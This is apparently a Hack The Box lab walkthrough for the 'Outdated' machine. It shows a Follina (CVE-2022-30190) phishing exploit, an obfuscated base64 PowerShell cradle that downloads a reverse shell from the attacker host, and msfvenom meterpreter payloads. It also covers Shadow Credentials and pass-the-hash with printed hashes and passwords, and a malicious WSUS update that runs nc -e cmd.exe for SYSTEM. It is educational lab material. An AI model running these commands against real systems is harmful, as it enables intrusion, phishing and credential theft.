---
date: 2025-04-10
categories: [CTF, HTB]
title: "HTB - Outdated"
tags: ['bloodhound', 'hashcat', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'smb', 'windows']

description: "Outdated - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Outdated

NMAP

![image1](../resources/9933f4867b9f4607b7b8fe1039b4248e.png)


![image2](../resources/e262582a42764977ae34da0cec6488b8.png)

Add outdated.htb to /etc/hosts

Add mail.outdated.htb to /etc/hosts

```bash
enum4linux -u "Guest" -a 10.129.229.239

```

![image3](../resources/dda2203ff38247939830b6ad11abfc9b.png)

/Shares is "**OK OK"**

```bash
smbclient -U Guest \\\\10.129.229.239\\Shares

```

![image4](../resources/41daf01379c34eb68928a14eeaa71989.png)


![image5](../resources/d4da6eb869364ebfbffc0d155613ef7d.png)

- Interesting file:

![image6](../resources/c0d50efd3e134073a89d90adfd737dac.png)

- Here we can see an email address **itsupport@outdated.htb**
- As well as a list of potentially non patched CVE's

- The first one stands out because it can partly be exploited through email

\*\* Edit: The Word document wasn't sent in this room because the victim client machine doesn't actually have Office installed.

So what happened was, instead of sending the Word .docx document, which would call for the exploit.html file, once someone opened the Word document.
We need to host the exploit.html file and send a hyperlink, in the body of an email, to the victim

```bash
git clone https://github.com/onecloudemoji/CVE-2022-30190.git
```

![image7](../resources/ae28900723ce46e4b12cc3c08ccf83ff.png)

- That gives us a word document that will be sent to the victim to open
- Once opened, the word document will call back to the attacker machine and GET the exploit.html, which holds the payload


![image8](../resources/1cce855b93b744cabc52c05b462fedf8.png)

\*ours is called exploit.html

- **<u>Edit the word document:</u>**
  - Rename the word doc to **.zip** - so we can see the .xml files inside

![image9](../resources/1aca55f8e6e74598a30e968b65ffd6d7.png)


![image10](../resources/e2bf877914c24ce9a420fafd5e7c7d27.png)

- Extract the contents

![image11](../resources/ba981bd9e5c540deb33f85156807f56f.png)

- Navigate to **clickme/word/\_rels/document.xml.rels**

![image12](../resources/9018e8772fe94e8496fbb217d11d4055.png)


![image13](../resources/54633cc8a2eb49a184cb07b165e92286.png)


![image14](../resources/03e579a944e14a24af4a6bd0c5f7059c.png)

- We need to edit the highlighted line to point to our attack machine

- **YOU MUST keep the exclamation mark!** It will not run if you omit this from the end of the URL


![image15](../resources/7b86c660f52a43cfb8b2d57f5a91b9cf.png)


![image16](../resources/c3a94c92141f4cd6a8552ab68d47a781.png)

- Right click on the clickme folder and Create Archive and choose .zip again

![image17](../resources/ef5ccc0ca572401b99b9210423f831c3.png)


![image18](../resources/03a15c1f83a247479bfdd30e345926c8.png)

- Now just rename the .zip back to .docx

![image19](../resources/ac886b55b4174594baa5de847d7f59db.png)


![image20](../resources/1be6aa2fa8b14812bdc54eb6cb26d70f.png)

- **<u>Edit the exploit.html:</u>**

![image21](../resources/ed7379742a8a40449160f6f7fed4d363.png)

- **The exploit must contain at least 3541 characters before the window.location.href**,
and they must be within the script tag. There is about 6000 or so included in the exploit.html


![image22](../resources/dbfc4b04325247e99556838ad5181550.png)

- The window.location.href:

![image23](../resources/3d4d267b80984237b677bbb63d47329b.png)


![image24](../resources/2a3d4c6294ae483197da30b865478e66.png)

**<u>What is mpsigstub.exe?</u>**


![image25](../resources/27f936b660cc4547bf6ad5a039fc2c22.png)

- Atm the script is a POC that executes calculator

- We need to change the BrowseForFile parameter:

![image26](../resources/90ea18d0d1d54095b58e9a179c3b778e.png)

**<u>Add exploit:</u>**

- First download the Nishang Invoke-PowerShellTcp.ps1 script
<https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>

- At the bottom of the script, in order to trigger the reverse connection, we need to append:
```bash
Invoke-PowerShellTcp -Reverse -IPAddress <KALI IP> -Port 8081

```

![image27](../resources/024a0114938f4b5b83e2868bce54d6a4.png)

- Now we use Invoke-Expression to launch the ps1 file:
```powershell
Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTAuMTAuMTQuNjYvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxIikK'+[char]34+'))')))

```
- The bold base64 text above is:
```bash
IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.66/Invoke-PowerShellTcp.ps1")

```

![image28](../resources/a18b181b3c0c4dab9847bc428f11e30c.png)


![image29](../resources/f86091f06d7a4a33bcb5e0a330d95537.png)

**<u>Exploit setup:</u>**
- First we need to host the exploit.html:
```bash
sudo python -m http.server 80

```
- Set up a listener:
```bash
rlwrap -cAr nc -lvnp 8081

```
- Send an email to itsupport, with a clickable hyperlink:
```bash
swaks -s "mail.outdated.htb" -p "25" -t "itsupport@outdated.htb" -f "dev@outdated" --header "New web application" --body "The new web application http://10.10.14.66/exploit.html"

```
- Now wait for someone to click the link

![image30](../resources/04d8566ff8c143cca071a9196cf1f106.png)

- And we have a shell

![image31](../resources/400ae34dfc0047a4a0bb94e5a86abaf9.png)

- Upgrade to meterpreter (or just to have a backup shell):
```bash
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4447 -f exe -o reverse.exe
  curl http://10.10.14.66/reverse.exe -o reverse.exe
  msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.10.14.66; set lport 4447; exploit"
```

- The NMAP scan we did was for the DC
- But the person who clicked the link, is using a workstation (on the domain)
- And that is what we've gained a foothold on

```bash
systeminfo

```

![image32](../resources/eb9c89e79c85428b82683638ae330d1b.png)

- We can see the internal 172.16.20.20 address
As well as the fact that the **DNS server is on 172.16.20.1** (which the DC is hosting - from the NMAP scan)


![image33](../resources/b63f7eda3d934fb5829888cafae54623.png)

- Here we can see the different users for the local and domain:

![image34](../resources/0e25e27db0084049bb5971b34265cf8f.png)

```bash
arp -a

```

![image35](../resources/103a8cca1bac4069aed143e612f34534.png)

```bash
whoami /all

```

![image36](../resources/2665fd6a2ed7481da4a8187c4c09d1b6.png)

- Looking at the user btables:

![image37](../resources/4631bb214ba146c3b887d34d57b10556.png)

Got some plain credentials (for the user we already have):

**btables@outdated.htb**

**GHKKb7GEHcccdCT8tQV2QwL3**

- **<u>Enumerate the domain:</u>**

- Upload Sharphound:
```bash
.\SharpHound.exe --CollectionMethods All --Domain outdated.htb --ZipFileName loot.zip

```
- Copy the loot file back to the attacker
- Set up sudo neo4j console
- Open Bloodhound and drag the loot.zip file in

- Mark btables as owned and select

![image38](../resources/e567c1816f3b4410a1b5d86e2c48cc1e.png)


![image39](../resources/5ded1f57a78246a8b3eda7c333e6fa6e.png)


![image40](../resources/96798b46607c4a9ea65409c99b7a753b.png)


![image41](../resources/0a0e90e4ba5242ea84f7868503443a09.png)

- Download Whisker:
<https://github.com/eladshamir/Whisker>

<https://github.com/jakobfriedl/precompiled-binaries>

- Upload Whisker.exe to target:
```bash
.\Whisker.exe add /target:sflowers /domain:outdated.htb

```

![image42](../resources/f0f72b011b504333b5d34e6c21c6862f.png)

- Upload Rubeus:
- Run the command that was produced by Whisker:
```bash
.\Rubeus.exe asktgt /user:sflowers /certificate: <certificate base64> /password:"lxcgCS6Re5JsGCmq" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

```

![image43](../resources/80febfa0d07946d88ec76609904867be.png)

- Try and crack it with:
```bash
hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt

```
- What we can do instead is, use the NTLM hash with evil-winrm (as port 5985 is open):
```bash
evil-winrm -u sflowers -H "1FCDB1F6015DCB318CC77BB2BDA14DB5" -i outdated.htb

```

![image44](../resources/e51bda1bbf7b42e8a27f9e05c73ed0ad.png)


![image45](../resources/8d637a69e60d4c158e5716d6f1418e98.png)

```bash
whoami /all

```

![image46](../resources/3eec68fd94cc4a3e9217d37859ea45c3.png)

- One thing that stands out is the group **OUTDATED\WSUS Administrators**

- Check if WSUS is active and being used:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer

```

![image47](../resources/4248598340a34c61a8c6c3034894a872.png)

- Get the address of the WSUS server:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

```

![image48](../resources/7084f69bb28142e7979fe218fb44a5a2.png)

By default, WSUS will use port **8530 for HTTP** and **8531 for HTTPS**

So we can see that it's using HTTP here

**<u>Exploit:</u>**

- Download SharpWSUS:
<https://github.com/h4rithd/PrecompiledBinaries/tree/main/SharpWSUS>

- Upload SharpWSUS.exe,PSExec.exe and nc.exe to the DC:

![image49](../resources/5290831974f84e0baef6a53d2200751a.png)

- We need to create a new malicious update
**(NOTE: The payload has to be a windows signed binary)**

Hence why we are using PSExec from SysInternals

- Create the malicious WSUS update:
```bash
.\SharpWSUS.exe create /payload:"C:\Users\sflowers\Downloads\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\Downloads\\nc.exe -e cmd.exe 10.10.14.66 8444" /title:"Important Update4" /date:2024-01-02 /kb:500130 /rating:Important /description:"Really important update" /url:"https://google.com"

```

![image50](../resources/558b5d2fef64473a8694d37c839d51d5.png)

- Approve the update:
```bash
.\SharpWSUS.exe approve /updateid:8a4c761a-4c52-4130-b987-ee1d2cd54b3d /computername:dc.outdated.htb, /groupname:"Important Group1"

```

![image51](../resources/6816974cd7704c378ed7fcfdb8049c8b.png)

- Setup a listener and wait

- And we get a shell as SYSTEM:

![image52](../resources/b8c896702c07444f8b0816c1313e122f.png)